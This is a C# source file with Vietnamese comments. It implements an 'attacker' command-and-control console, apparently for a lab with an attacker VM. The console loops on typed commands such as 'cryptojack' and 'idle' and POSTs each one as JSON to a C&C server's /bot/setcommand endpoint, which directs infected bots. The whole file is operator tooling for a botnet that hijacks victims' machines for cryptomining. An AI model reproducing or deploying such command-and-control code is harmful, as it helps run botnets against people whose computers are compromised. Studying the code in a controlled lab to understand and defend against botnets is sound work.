using System;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

// =======================================================
// === BẢNG ĐIỀU KHIỂN CỦA ATTACKER (ATTACKER'S CONSOLE) ===
// =======================================================

public class AttackerControlPanel
{
    // !!! QUAN TRỌNG: Đặt địa chỉ IP của máy ATTACKER VM vào đây
    private static readonly string CncServerIp = "127.0.0.1";
    private static readonly string CncServerUrl = $"http://{CncServerIp}:8000";

    private static readonly HttpClient client = new HttpClient();

    static async Task Main(string[] args)
    {
        Console.Title = "Attacker C&C Control Panel";
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine(@"
    ___    ____  __   ____  ____  ____  __ _  ____  ____
   / __)  / __/ / _\ (  _ \(  _ \(  __)(  ( \/ ___)(  __)
  ( (__  ( (_ \/    \ )   / )   / ) _) /    /\___ \ ) _)
   \___)  \___/\_/\_/(__\_)(__\_)(____)\_)__)(____/(____)
        ");
        Console.ResetColor();
        Console.WriteLine($"Targeting C&C Server at: {CncServerUrl}");
        Console.WriteLine("Enter command (e.g., 'cryptojack', 'idle') or type 'exit' to quit.");
        Console.WriteLine("-----------------------------------------------------------------");

        // Vòng lặp vô tận để nhận lệnh từ người dùng
        while (true)
        {
            Console.Write("command> ");
            string inputCommand = Console.ReadLine();

            if (string.IsNullOrWhiteSpace(inputCommand))
            {
                continue;
            }

            if (inputCommand.ToLower() == "exit" || inputCommand.ToLower() == "quit")
            {
                break; // Thoát khỏi vòng lặp nếu người dùng gõ 'exit'
            }

            // Gửi lệnh đến C&C Server
            await SendCommandToServer(inputCommand);
        }

        Console.WriteLine("Control panel shutting down.");
    }

    // Hàm để gửi lệnh POST đến C&C Server
    static async Task SendCommandToServer(string commandToSend)
    {
        try
        {
            // Tạo đối tượng payload để gửi đi dưới dạng JSON
            var payload = new { Command = commandToSend };
            var jsonContent = JsonSerializer.Serialize(payload);
            var httpContent = new StringContent(jsonContent, Encoding.UTF8, "application/json");

            Console.WriteLine($"Sending command '{commandToSend}'...");

            // Gửi request POST
            HttpResponseMessage response = await client.PostAsync($"{CncServerUrl}/bot/setcommand", httpContent);

            // Kiểm tra và in ra kết quả
            if (response.IsSuccessStatusCode)
            {
                string responseBody = await response.Content.ReadAsStringAsync();
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"SUCCESS: Server responded -> '{responseBody}'");
                Console.ResetColor();
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"FAILED: Server returned status code {response.StatusCode}");
                Console.ResetColor();
            }
        }
        catch (Exception ex)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"ERROR: Could not send command. Is the C&C server running? Details: {ex.Message}");
            Console.ResetColor();
        }
    }
}